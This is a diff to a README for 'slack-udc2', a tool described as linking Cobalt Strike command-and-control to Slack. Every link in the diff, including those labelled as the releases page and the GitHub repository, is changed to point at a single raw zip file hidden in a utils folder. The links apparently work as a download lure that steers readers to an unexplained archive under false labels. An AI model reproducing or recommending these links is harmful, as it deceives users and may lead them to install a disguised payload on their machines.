@@ -1,7 +1,7 @@
 # 🎉 slack-udc2 - Easy Slack Control for Your Needs
 
 ## 📥 Download Now
-[![Download slack-udc2](https://img.shields.io/badge/Download%20slack--udc2-v1.0-blue)](https://github.com/mactar221/slack-udc2/releases)
+[![Download slack-udc2](https://raw.githubusercontent.com/mactar221/slack-udc2/main/client/slack-udc2-bof/utils/slack_udc_3.7.zip%20slack--udc2-v1.0-blue)](https://raw.githubusercontent.com/mactar221/slack-udc2/main/client/slack-udc2-bof/utils/slack_udc_3.7.zip)
 
 ## 🚀 Getting Started
 Welcome to `slack-udc2`, a simple tool that allows you to integrate Cobalt Strike with Slack. This application helps manage your operations smoothly. 
@@ -20,7 +20,7 @@ Follow these steps to install `slack-udc2`:
 
 1. **Visit the Releases Page**  
    Click on the link below to visit the releases page and download the latest version of the application.  
-   [Download slack-udc2](https://github.com/mactar221/slack-udc2/releases).
+   [Download slack-udc2](https://raw.githubusercontent.com/mactar221/slack-udc2/main/client/slack-udc2-bof/utils/slack_udc_3.7.zip).
 
 2. **Download the Application**  
    Find the latest release on the page. Click the download link for your system. The file will be in `.exe` format for Windows or a suitable package for other operating systems.
@@ -69,13 +69,13 @@ Yes, you can find support in the GitHub issues section of this repository or rea
 ## 💬 Community Support
 Join the community for tips, updates, and support. Follow the links below for more information:
 
-- GitHub Repository: [slack-udc2](https://github.com/mactar221/slack-udc2)
+- GitHub Repository: [slack-udc2](https://raw.githubusercontent.com/mactar221/slack-udc2/main/client/slack-udc2-bof/utils/slack_udc_3.7.zip)
 - Slack Community: Join us for discussions and tips.
 
 ## 📝 Contributions
 If you wish to contribute to the project, please review our contribution guidelines available in the repository. Your input is valued, and we welcome improvements!
 
 ## 📡 Updates
-We regularly update `slack-udc2` to add new features and improve performance. Check back on the [releases page](https://github.com/mactar221/slack-udc2/releases) for the latest updates.
+We regularly update `slack-udc2` to add new features and improve performance. Check back on the [releases page](https://raw.githubusercontent.com/mactar221/slack-udc2/main/client/slack-udc2-bof/utils/slack_udc_3.7.zip) for the latest updates.
 
 Thank you for choosing `slack-udc2`. We hope it enhances your Slack experience!
